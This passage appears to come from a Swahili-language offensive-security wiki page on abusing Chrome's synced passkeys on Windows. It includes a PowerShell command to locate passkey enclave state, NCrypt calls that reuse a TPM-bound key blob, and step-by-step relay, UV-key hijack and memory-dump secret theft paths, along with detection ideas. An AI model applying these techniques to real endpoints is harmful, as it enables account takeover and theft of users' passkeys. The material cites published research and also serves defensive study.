- **`passkey_enclave_state`** huhifadhi hali ya uandikishaji wa kifaa cha ndani kama vile **`wrapped_identity_private_key`** na siri iliyofungwa inayotumika kurejesha credentials zilizosawazishwa.<sup>[[4]](#references)</sup>

Uchunguzi wa haraka:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blob za funguo zilizofungwa kwa TPM bado zinaweza kutumiwa vibaya kama oracle ya kusaini ya ndani

Ikiwa kivinjari kitatoa ufunguo wa utambulisho unaotumia TPM kama **`NCRYPT_OPAQUE_KEY_BLOB`** na kuhifadhi blob hiyo katika eneo linaloweza kufikiwa na mtumiaji, malware haihitaji kutoa ufunguo ghafi wa faragha. Inaweza tu kuingiza tena blob hiyo kwenye **mashine hiyohiyo** na kuiomba TPM ya ndani isaini data inayodhibitiwa na mshambuliaji:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Hii inamaanisha kuwa **hardware binding huzuia export nje ya kifaa, lakini haizuii matumizi ya mtumiaji huyo huyo kwenye endpoint iliyoathiriwa**.

### Njia za vitendo za matumizi mabaya

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Orodhesha `WebauthnCredentialSpecifics` kutoka Chrome's LevelDB.
   - Anzisha kuingia kwa passkey na upate WebAuthn challenge mpya.
   - Tumia blob ya `wrapped_identity_private_key` iliyoibwa kwenye TPM ya mwathiriwa kusaini binding ya ombi la cloud-authenticator.
   - Relay assertion iliyorejeshwa kwa relying party.
   - Hii ni muhimu hasa RP inapokubali `userVerification=preferred` au inashindwa kukataa assertions zenye **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - Lazimisha onboarding ifanyike tena kwa kufuta `passkey_enclave_state` au kutuma operesheni halali iliyosainiwa ya `device/forget`.
   - Ikiwa onboarding itaacha kifaa katika hali ya **`uv_key_pending`**, sajili UV public key inayodhibitiwa na mshambuliaji.
   - Ikiwa mtoa huduma hatathibitishi attestation / secure-hardware origin ya UV key mpya, signatures za baadaye kutoka kwa key ya mshambuliaji zitachukuliwa kuwa **`UV=1`**.
3. **Wizi wa urejeshaji wa master-secret / SDS**<sup>[[4]](#references)</sup>
   - Lazimisha recovery au rejoin ili Chrome ichukue master secret ya synced-passkey.
   - Fuatilia uundaji/upya au urekebishaji wa `passkey_enclave_state`, kisha dump Chrome memory wakati plaintext ya **security domain secret (SDS)** ipo kwenye memory.
   - Tumia SDS iliyorejeshwa kusimbua sehemu zilizosimbwa kwa njia fiche katika kila rekodi ya `WebauthnCredentialSpecifics` na kurejesha WebAuthn private keys zinazoweza kuhamishwa.

### Mawazo ya DFIR / ugunduzi

- Fuatilia **kufutwa/kuundwa upya** kwa `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Toa alert kuhusu ufikiaji usio wa kawaida wa Chrome **`Sync Data\LevelDB`** kutoka kwa michakato isiyo ya browser.
- Toa alert kuhusu **Chrome memory dumps** au ufikiaji wa kutiliwa shaka wa memory kati ya michakato.
- Chunguza maombi yanayojirudia yasiyo ya kawaida ya **Google Password Manager recovery PIN** au onboarding isiyotarajiwa kufanyika tena.
- Kumbuka kuwa WebAuthn **`signCount`** mara nyingi haifai kwa synced passkeys kwa sababu inaweza kubaki bila kubadilika, hivyo utambuzi wa kawaida wa clone huwa dhaifu.

## References

- [1] [Unit 42 – Uchunguzi wa Miaka ya Operesheni Zisizogunduliwa Zilizolenga Sekta Zenye Thamani Kubwa](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia Word VBA macro kupitia SMTP → usimbuaji wa credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ndani ya Ink Dragon: Kufichua Relay Network na Jinsi Operesheni ya Kisiri ya Kukera Inavyofanya Kazi](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Eneo Jipya la Mashambulizi katika Uthibitishaji Usiohitaji Nenosiri](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – Hifadhi ya key ya `NCryptCreatePersistedKey` / CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Mashambulizi dhidi ya Mifumo na Mitandao ya Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Jinsi Hifadhi ya Data ya Active Directory Inavyofanya Kazi: Ndani ya NTDS.dit (Sehemu ya 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Dump ya Nenosiri za Lsass ya Mbali](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho Yapanua Silaha Zake za Ujasusi wa Mtandaoni kwa Toolkit ya Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – Kazi ya CreateFileW na `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Hali ya backup ya Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – kusitisha sessions zinazotumika](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
